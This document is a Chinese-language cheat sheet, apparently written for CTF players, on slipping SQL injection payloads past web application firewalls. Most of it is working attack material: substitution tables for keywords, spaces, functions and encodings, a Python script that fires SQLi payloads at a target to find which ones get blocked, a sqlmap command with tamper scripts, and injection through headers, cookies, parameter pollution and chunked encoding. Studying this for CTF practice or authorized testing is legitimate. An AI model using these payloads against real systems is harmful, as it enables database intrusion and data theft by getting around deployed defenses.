---
title: SQL 注入 WAF 绕过技巧集
category: web
tags: [waf 绕过, sqli, 编码, 注释混写]
signals: [被 waf 拦截, 403, 请求被防火墙阻断, 关键词被过滤, select 不能用, space 被过滤, 数据库关键字黑名单, union 被拦, 出现 406 或 拦截页面]
difficulty: medium
source: "PayloadsAllTheThings / HackTricks / 公开 writeup"
tools: [curl, burpsuite, sqlmap, tamper 脚本]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 正常 payload 返回 403 / 406 / "Your request has been blocked"。
- 但把 `union` 换成 `union/**/` 或大小写混写能通过 —— 关键词黑名单。
- 空格被过滤：payload 里空格变成 `%20` 被拦，但 `/**/`、`%0a`、`+` 可用。
- 逗号被过滤、`select` 被过滤、`and/or` 被过滤。
- 题目提示"有 WAF"、"过滤了某些字符"，或给了一个 modsecurity 规则的暗示。
- 变体：`information_schema` 被拦；`sleep` 被拦；`substr` 被拦。
- 关键词：waf、bypass、过滤、tamper、403。

## 二、原理

WAF 基于**黑名单正则**匹配请求（URL、body、header、cookie）。绕过本质是**让攻击语义对数据库有效、而对 WAF 的正则无效**：

1. **语法等价替换**：`union select` ↔ `union/**/select`、`UNION(SELECT)`、`union%0aselect`。
2. **编码层混淆**：URL 双重编码、Unicode、大小写、`%00` 截断。
3. **语义变形**：`substr` → `mid`/`substring`/`left`/`right`，`sleep` → `benchmark`，`information_schema.tables` → `mysql.innodb_table_stats`。
4. **参数位置**：WAF 只看 GET 时，改用 POST body / Cookie / `X-Forwarded-For`。
5. **分块/分片**：HTTP 分块传输、参数污染（HPP）让 WAF 与后端解析不一致。

## 三、解题步骤

1. 先定位"哪个词被拦"：用逐步缩短的 payload 二分测试（`1 and 1=1`、`1/**/and/**/1=1`、`1 and%091=1`）。
2. 按被拦元素选择替代语法表。
3. 用 sqlmap `--tamper=` 批量试（`space2comment`、`between`、`charencode`）。
4. 若 WAF 在前面（如云 WAF），把 payload 放进后端不检查的 header 或 JSON 字段。
5. 最终确认注入成功（回显/延时/报错）。

## 四、可直接运行的脚本

替代关键词速查表：

```text
# 空格替代
/**/   %09   %0a   %0b   %0c   %0d   %a0   (+)   (1)and(1)

# 关键词拆分（MySQL 把注释当空白）
un/**/ion   sel/**/ect    UNI%0aON

# 大小写 / 括号
uNiOn SeLeCt   union(select(1))   union%0aselect

# 函数替换
substr -> mid / substring / left / right
ascii -> ord
sleep -> benchmark(10000000,md5(1)) / 笛卡尔积
concat -> concat_ws / group_concat

# information_schema 被拦
MySQL  -> mysql.innodb_table_stats / mysql.innodb_index_stats
         performance_schema 也行（部分版本）
SQLServer -> sys.objects / syscolumns
Oracle -> all_tables / all_tab_columns

# and / or 被拦
&&   ||   %26%26   %7c%7c

# 等号被拦
LIKE   REGEXP   BETWEEN   IN   >a <b
?id=1 and 1 like 1

# 引号被拦
0x hex：0x756e696f6e -> "union"
CHAR(117,110,105,111,110)
```

WAF 探测脚本（定位被拦关键词）：

```python
import requests

BASE = "http://TARGET/index.php"
PAYLOADS = [
    "1' and '1'='1",
    "1%' and '1'='1",
    "1' and/**/'1'='1",
    "1'%09and%09'1'='1",
    "1' and '1' like '1",
    "1' or 1#",
    "1' union select 1-- -",
    "1' union/**/select/**/1-- -",
    "1' union(select(1))-- -",
    "1' and ascii(mid(database(),1,1))>64-- -",
    "1' and if(1,benchmark(1000000,md5(1)),0)-- -",
]
for p in PAYLOADS:
    try:
        r = requests.get(BASE, params={"id": p}, timeout=10)
        print(f"{r.status_code}  len={len(r.text):6d}  {p}")
    except Exception as e:
        print("ERR", p, e)
```

sqlmap tamper 组合：

```bash
sqlmap -u "http://TARGET/index.php?id=1" \
  --tamper=space2comment,between,charencode,randomcase \
  --batch --random-agent --delay=0.5 --level=3 --risk=3

# 常见 tamper 列表
# space2comment  space2hash  space2mssqlblank  between
# randomcase  charencode  charunicodeencode  modsecurityversioned
# percentage  apostrophemask  equaltolike  unionalltounion
```

其他手法：

```text
# 1. 换位置：GET 注入点被拦 -> 试 POST body / Cookie
Cookie: session=1' and 1=1-- -
X-Forwarded-For: 1' or sleep(3)-- -

# 2. HPP（服务端取最后一个值时）
?id=1&id=1' union select 1,2,3-- -

# 3. 分块传输（让 WAF 拼不出完整 payload）
Transfer-Encoding: chunked

# 4. 双重 URL 编码（后端会解码两次的场景）
%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65   -> union 的二次编码
```

## 五、常见坑 / 变体

- **注释 `--` 必须后跟空白**：`--%20`、`--+-`、`#`（`%23`）是最常忘的细节。
- **`/**/` 在某些 WAF 规则里也是关键词**：被拦就换 `%0a`、`%09`；`%0a` 在 MySQL 中有效。
- **大小写绕过只对小写匹配的规则有效**：ModSecurity 的规则默认不区分大小写（`t:lowercase`），别白费功夫。
- **MySQL 的 `union select` 需要空格**：`union(select...)` 或 `union%0aselect`，`union/**/select` 都行。
- **`0x` 十六进制字符串**：MySQL 支持 `0x...` 作为字符串字面量，但**不能**写在 `LIKE` 的引号位置。
- 变体：**正则只拦 `select\s+`** 时用 `select/**/*`；**只拦 `sleep(`** 时用 `sleep/**/(3)`；**只拦小写 `union`** 时用 `Union`。
- 变体：WAF 在 CDN 层，真实 IP 直连可绕过（只做授权测试）。

## 六、参考来源

- [PayloadsAllTheThings - SQL Injection / WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP WSTG - Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [sqlmap tamper 脚本目录](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [HackTricks - SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
